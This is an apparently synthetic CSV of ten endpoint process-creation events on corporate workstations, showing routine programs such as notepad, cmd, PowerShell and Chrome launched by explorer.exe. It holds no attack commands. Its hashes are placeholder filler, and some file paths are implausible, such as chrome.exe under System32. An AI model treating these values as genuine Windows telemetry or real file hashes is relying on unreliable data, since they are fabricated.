TimeGenerated,Timestamp,DeviceName,DeviceId,AccountName,AccountDomain,FileName,FolderPath,ProcessCommandLine,ProcessId,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,InitiatingProcessSHA256,InitiatingProcessSignatureStatus,InitiatingProcessSignerType,ProcessIntegrityLevel,ProcessTokenElevation,Type
2026-04-29T03:56:34Z,2026-04-29T03:56:34Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,notepad.exe,C:\Windows\System32,notepad.exe,6204,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,3333197,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1962,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T03:36:18Z,2026-04-29T03:36:18Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,4153,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,866018,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5694,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T06:40:30Z,2026-04-29T06:40:30Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,5809,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,1665694,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5121,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T16:42:35Z,2026-04-28T16:42:35Z,WS-HR-03,dev-ws-hr-03,jadams,CORP,notepad.exe,C:\Windows\System32,notepad.exe,6634,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,2308305,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6350,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:30:34Z,2026-04-29T11:30:34Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,powershell.exe,C:\Windows\System32,powershell.exe,4091,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4728164,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9463,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T07:52:17Z,2026-04-29T07:52:17Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,notepad.exe,C:\Windows\System32,notepad.exe,6141,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,4166188,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8095,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T06:58:30Z,2026-04-29T06:58:30Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,explorer.exe,C:\Windows\System32,explorer.exe,1965,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,1549809,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3155,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T05:47:58Z,2026-04-29T05:47:58Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3626,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4582759,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3559,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T03:16:56Z,2026-04-29T03:16:56Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,powershell.exe,C:\Windows\System32,powershell.exe,2489,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,3717428,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1663,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T06:05:53Z,2026-04-29T06:05:53Z,WS-HR-03,dev-ws-hr-03,mholmes,CORP,chrome.exe,C:\Windows\System32,chrome.exe,7908,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,3884183,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9292,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
